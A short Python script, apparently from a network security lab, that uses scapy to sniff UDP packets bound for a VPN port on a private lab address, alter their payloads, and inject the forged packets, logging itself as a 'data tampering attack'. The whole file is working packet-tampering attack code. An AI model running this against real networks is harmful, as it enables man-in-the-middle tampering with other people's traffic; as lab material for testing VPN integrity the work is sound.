#!/usr/bin/env python3
from scapy.all import sniff, send, IP, UDP, Raw

def log_event(msg):
    print(f"[TAMPER] {msg}")

def tamper_packets(server_ip="10.9.0.11", vpn_port=9090):
    log_event("Starting data tampering attack")

    def modify_packet(pkt):
        if UDP in pkt and pkt[UDP].dport == vpn_port and Raw in pkt:
            original = bytes(pkt[Raw].load)
            modified = original.replace(b'a', b'X')  # Simple visible change

            tampered_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src) / \
                           UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport) / \
                           modified

            send(tampered_pkt, verbose=0)
            log_event(f"Tampered: {original[:16]}... -> {modified[:16]}...")

    sniff(filter=f"udp and dst port {vpn_port}", prn=modify_packet, store=0)

if __name__ == "__main__":
    tamper_packets()
